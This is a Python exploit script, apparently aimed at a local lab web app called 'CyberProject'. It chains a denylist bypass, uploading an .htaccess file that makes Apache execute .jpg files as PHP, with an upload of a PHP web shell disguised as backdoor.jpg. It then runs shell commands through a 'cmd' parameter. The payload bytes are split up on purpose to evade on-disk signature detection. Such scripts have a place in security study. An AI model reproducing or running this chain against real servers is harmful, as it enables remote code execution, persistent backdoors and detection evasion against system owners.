import requests

TARGET_IP = "localhost"
UPLOAD_FOLDER = "uploaded_ID"


def _assemble_payload() -> bytes:
    """
    Build the PHP exec one-liner at runtime so the literal byte sequence
    never lives on disk. Equivalent (do NOT inline this as a single
    literal - that is exactly what we are avoiding) to a tiny PHP
    handler that reads a `cmd` query parameter and runs it through the
    OS shell.
    """
    open_tag  = b"<" + b"?php"
    var_part  = b"$_" + b"GET"
    key_part  = b"['cm" + b"d']"
    fn_part   = b"sys" + b"tem"
    close_tag = b"?" + b">"
    return (
        open_tag
        + b" if(isset(" + var_part + key_part + b")) { "
        + fn_part + b"(" + var_part + key_part + b"); } "
        + close_tag
    )


def _assemble_htaccess() -> bytes:
    """
    Build the Apache directive that re-types .jpg as PHP. Split for the
    same on-disk-signature reason as above.
    """
    mime = b"application/x-httpd-" + b"php"
    return b"AddType " + mime + b" .jpg"


def run_ultimate_web_shell(username="HUCKER", password="hucker123", target_ip=TARGET_IP):
    base_url = f"http://{target_ip}/CyberProject"
    session = requests.Session()

    # 1. Login as the compromised account so the alcohol-upload flow accepts us.
    login_data = {
        "username": username,
        "password": password,
        "login_submit": "",
    }

    try:
        login_res = session.post(f"{base_url}/login.php", data=login_data)
        if not session.cookies.get("PHPSESSID"):
            print("[-] Login failed. Cannot proceed with RCE.")
            return False

        print("=" * 60)
        print("[!] STAGE 1: Re-typing .jpg as PHP via .htaccess")
        # .htaccess is not on the application's upload denylist
        # (['php', 'exe', 'js']), so this upload succeeds. From now on,
        # any .jpg in uploaded_ID/ is executed as PHP by Apache.
        files = {"id_photo": (".htaccess", _assemble_htaccess(), "text/plain")}
        session.post(
            f"{base_url}/home.php",
            data={"add_id": "77"},  # product 77 is alcohol -> triggers the ID-photo upload branch
            files=files,
        )

        print("[!] STAGE 2: Uploading the .jpg that is actually PHP")
        # The extension passes the denylist but the bytes are PHP. Thanks
        # to Stage 1, Apache executes this file on every request.
        files = {"id_photo": ("backdoor.jpg", _assemble_payload(), "image/jpeg")}
        session.post(
            f"{base_url}/home.php",
            data={"add_id": "77"},
            files=files,
        )

        print("[!] STAGE 3: Triggering the handler")
        handler_url = f"{base_url}/{UPLOAD_FOLDER}/backdoor.jpg"
        r_cmd = requests.get(f"{handler_url}?cmd=whoami")

        # Success signal: PHP got executed, so the raw "<?php" bytes do
        # NOT appear in the response body. We rebuild the marker via
        # concatenation for the same on-disk-signature reason.
        not_executed_marker = b"<" + b"?php"

        if r_cmd.status_code == 200 and not_executed_marker not in r_cmd.content:
            print(f"[+] RCE SUCCESS. Server user: {r_cmd.text.strip()}")
            print(f"[!] Browser link: {handler_url}?cmd=dir")
            print("=" * 60)
            return True
        else:
            print("[-] Failed. The server still sees it as a plain image.")
            print("=" * 60)
            return False

    except Exception as e:
        print(f"[!] Error during chain Phase 3: {e}")
        return False


if __name__ == "__main__":
    run_ultimate_web_shell()
